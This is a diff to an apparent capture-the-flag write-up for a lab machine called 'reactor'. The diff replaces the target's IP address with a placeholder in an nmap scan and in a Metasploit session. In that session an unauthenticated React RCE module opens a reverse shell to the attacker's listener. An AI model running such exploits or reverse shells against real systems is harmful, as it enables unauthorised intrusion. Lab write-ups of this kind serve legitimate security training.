@@ -15,9 +15,9 @@ date: 2026-07-08
 My first approach was using `nmap` to scan target IP address ports:
 
 ```bash
-nmap 10.129.39.6
+nmap <IP_ADDRESS>
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-03 20:17 +07
-Nmap scan report for reactor.htb (10.129.39.6)
+Nmap scan report for reactor.htb (<IP_ADDRESS>)
 Host is up (0.15s latency).
 Not shown: 998 closed tcp ports (conn-refused)
 PORT     STATE SERVICE
@@ -148,12 +148,12 @@ To start the exploit process, using command `exploit`
 
 ```bash
 [msf](Jobs:0 Agents:0) exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) >> check
-[+] 10.129.39.6:3000 - The target appears to be vulnerable.
+[+] <IP_ADDRESS>:3000 - The target appears to be vulnerable.
 [msf](Jobs:0 Agents:0) exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) >> exploit
 [*] Started reverse TCP handler on 10.10.16.22:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable.
-[*] Command shell session 1 opened (10.10.16.22:4444 -> 10.129.39.6:60250) at 2026-09-03 21:16:44 +0700
+[*] Command shell session 1 opened (10.10.16.22:4444 -> <IP_ADDRESS>:60250) at 2026-09-03 21:16:44 +0700
 
 node@reactor:/opt/reactor-app$ id
 id
